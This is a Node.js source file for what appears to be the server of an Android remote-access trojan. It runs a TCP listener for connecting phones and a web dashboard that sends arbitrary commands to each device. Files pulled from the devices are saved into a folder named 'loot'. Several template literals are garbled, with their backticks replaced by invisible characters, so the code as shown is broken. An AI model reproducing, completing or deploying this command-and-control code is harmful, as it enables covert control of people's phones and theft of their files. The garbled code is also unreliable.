const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server);
const path = require('path');
const net = require('net');
const fs = require('fs');

// ===== Create loot folder =====
const LOOT_DIR = path.join(__dirname, 'loot');
if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR);

// ===== Serve dashboard =====
app.use(express.static(path.join(__dirname, 'public')));

// ===== Store connected devices =====
const devices = {};

// ================= TCP SERVER (Android) =================
const TCP_PORT = 8080;

const tcpServer = net.createServer((socket) => {
    console.log('Android device connected via TCP');

    let deviceId = null;
    let buffer = '';

    socket.on('data', (data) => {
        buffer += data.toString();
        let lines = buffer.split('\n');
        buffer = lines.pop();

        for (let line of lines) {
            const message = line.trim();
            if (!message) continue;

            if (message.startsWith('DEVICE_INFO:')) {
                const info = message.substring(12);

                deviceId = "Device_" + socket.remoteAddress.replace(/[^0-9]/g, '');

                devices[deviceId] = {
                    id: deviceId,
                    socket: socket,
                    status: 'connected',
                    lastSeen: new Date(),
                    info: info
                };

                io.emit('device_connected', {
                    id: deviceId,
                    status: 'connected',
                    lastSeen: devices[deviceId].lastSeen
                });

            } else if (message.includes('_RESPONSE:')) {
                const index = message.indexOf(':');
                const type = message.substring(0, index);
                const dataMsg = message.substring(index + 1);

                io.emit('device_response', {
                    deviceId: deviceId,
                    type: type,
                    data: dataMsg
                });

                // Save downloaded file
                if (type === 'DOWNLOAD_RESPONSE') {
                    try {
                        const parts = dataMsg.split(':');
                        if (parts[0] !== 'ERROR') {
                            const fileName = parts[0];
                            const base64Data = parts[1];

                            const filePath = path.join(
                                LOOT_DIR,
                                ⁠ ${Date.now()}_${fileName} ⁠
                            );

                            fs.writeFileSync(filePath, Buffer.from(base64Data, 'base64'));
                            console.log(⁠ File saved: ${filePath} ⁠);
                        }
                    } catch (err) {
                        console.error('File save error:', err);
                    }
                }
            }
        }
    });

    socket.on('end', () => {
        if (deviceId && devices[deviceId]) {
            devices[deviceId].status = 'disconnected';
            io.emit('device_disconnected', { id: deviceId });
        }
        console.log('Android disconnected');
    });

    socket.on('error', (err) => {
        console.error('TCP Error:', err);
    });
});

// Start TCP server
tcpServer.listen(TCP_PORT, '0.0.0.0', () => {
    console.log(⁠ TCP Server running on port ${TCP_PORT} ⁠);
});

// ================= DASHBOARD SOCKET =================
io.on('connection', (socket) => {
    console.log('Dashboard connected');

    // Send existing devices
    for (const id in devices) {
        socket.emit('device_connected', devices[id]);
    }

    // Send command to device
    socket.on('command', (data) => {
        const { deviceId, command, params } = data;
        const device = devices[deviceId];

        if (device && device.socket) {
            const msg = ⁠ ${command}:${params || ''}\n ⁠;
            device.socket.write(msg);   // ✅ correct for TCP
            console.log(⁠ Sent → ${deviceId}: ${msg} ⁠);
        }
    });
});

// ================= HTTP SERVER =================
const HTTP_PORT = process.env.PORT || 3000;

server.listen(HTTP_PORT, '0.0.0.0', () => {
    console.log(⁠ Server running on port ${HTTP_PORT} ⁠);
});
